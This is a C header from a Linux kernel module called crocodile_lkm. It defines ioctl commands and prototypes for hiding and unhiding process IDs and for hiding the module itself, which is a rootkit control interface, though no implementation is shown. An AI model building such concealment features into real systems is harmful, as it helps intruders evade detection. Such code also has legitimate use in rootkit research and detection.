/*
 * crocodile_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_
#define _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_

#include "device/types.h"

/******************************************************************************
 * Ioctl definitions
 ******************************************************************************/

/* Use 'k' as magic number */
#define CROC_IOC_MAGIC          'k'

#define CROC_IOC_MAX_NR         1

#define CROC_IOC_RESET          _IO(CROC_IOC_MAGIC, 0)

#define CROC_IOC_HIDE_PID       _IOW(CROC_IOC_MAGIC,  1, int)
#define CROC_IOC_SHOW_PID       _IOW(CROC_IOC_MAGIC,  2, int)
#define CROC_IOC_HIDE_MODULE    _IOW(CROC_IOC_MAGIC,  3, int)
#define CROC_IOC_SHOW_MODULE    _IOW(CROC_IOC_MAGIC,  4, int)

int ioc_hide_pid(module_dev_t* p_dev, pid_t pid);

int ioc_show_pid(module_dev_t* p_dev, pid_t pid);

#endif /* _CROCODILE_LKM_DEVICE_IOCTL_CMD_H_ */

